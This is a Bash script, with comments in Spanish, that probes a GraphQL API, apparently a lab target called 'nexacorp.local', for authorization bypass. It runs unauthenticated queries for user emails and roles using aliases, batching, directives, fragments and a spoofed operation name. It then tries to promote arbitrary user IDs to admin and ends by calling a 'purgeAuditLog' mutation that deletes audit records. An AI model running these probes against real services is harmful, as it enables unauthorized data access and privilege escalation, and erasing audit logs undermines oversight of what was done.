#!/usr/bin/env bash
# Bypass de auth en GraphQL — aliases, fragments, batching, directivas, casos edge
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

probe() {
  local name="$1"
  local payload_file="$2"
  echo "=========================================="
  echo "[*] ${name}"
  echo "------ SIN auth ------"
  curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" --data-binary @"${payload_file}" | jq -c
  echo "------ CON recon_token ------"
  curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${RECON_TOKEN}" --data-binary @"${payload_file}" | jq -c
  echo
}

# 1. Aliases — pedir users con varios nombres
cat > /tmp/gql_alias.json <<'EOF'
{"query":"{ a:users { id email role } b:users { id email } c:me { id email role } }"}
EOF
probe "Aliases múltiples" /tmp/gql_alias.json

# 2. Batching — array de queries
cat > /tmp/gql_batch.json <<'EOF'
[{"query":"{ users { id email role } }"},{"query":"{ me { id email } }"},{"query":"{ internalLogs }"}]
EOF
probe "Batch array de queries" /tmp/gql_batch.json

# 3. Directivas @skip / @include
cat > /tmp/gql_dir.json <<'EOF'
{"query":"query($t:Boolean!){ users @include(if:$t){ id email role } }","variables":{"t":true}}
EOF
probe "Directiva @include" /tmp/gql_dir.json

# 4. Fragments
cat > /tmp/gql_frag.json <<'EOF'
{"query":"fragment U on User { id email role permissions } { users { ...U } me { ...U } }"}
EOF
probe "Fragment" /tmp/gql_frag.json

# 5. Operation name distinta (a veces el resolver chequea el nombre)
cat > /tmp/gql_opname.json <<'EOF'
{"operationName":"IntrospectionQuery","query":"query IntrospectionQuery { users { id email role } }"}
EOF
probe "operationName=IntrospectionQuery" /tmp/gql_opname.json

# 6. GET en vez de POST
echo "=========================================="
echo "[*] GET en vez de POST"
curl -s -G "${GQL_URL}" \
  --data-urlencode 'query={ users { id email role } me { id email } }' | jq -c
echo

# 7. Query con __typename forzado
cat > /tmp/gql_type.json <<'EOF'
{"query":"{ users { __typename id email role } me { __typename id email } }"}
EOF
probe "Forzar __typename" /tmp/gql_type.json

# 8. updateProfile sin auth — puede crear/devolver un user implícito
echo "=========================================="
echo "[*] updateProfile (sin args y con args)"
echo "------ Sin args ------"
curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateProfile { id email role permissions } }"}' | jq -c
echo "------ Con args ------"
curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateProfile(displayName:\"pwn\",email:\"pwn@nexacorp.local\") { id email role permissions } }"}' | jq -c
echo

# 9. promoteUser — quizá si pasas tu propio id arbitrario crea el user
echo "=========================================="
echo "[*] promoteUser con valores arbitrarios"
for uid in "1" "0" "admin" "self"; do
  echo "  userId=${uid}"
  curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation { promoteUser(userId:\\\"${uid}\\\",role:\\\"admin\\\") { id email role permissions } }\"}" | jq -c
done

# 10. purgeAuditLog — devuelve Bool, ¿pista?
echo "=========================================="
echo "[*] purgeAuditLog"
curl -s -X POST "${GQL_URL}" -H "Content-Type: application/json" \
  -d '{"query":"mutation { purgeAuditLog }"}' | jq -c
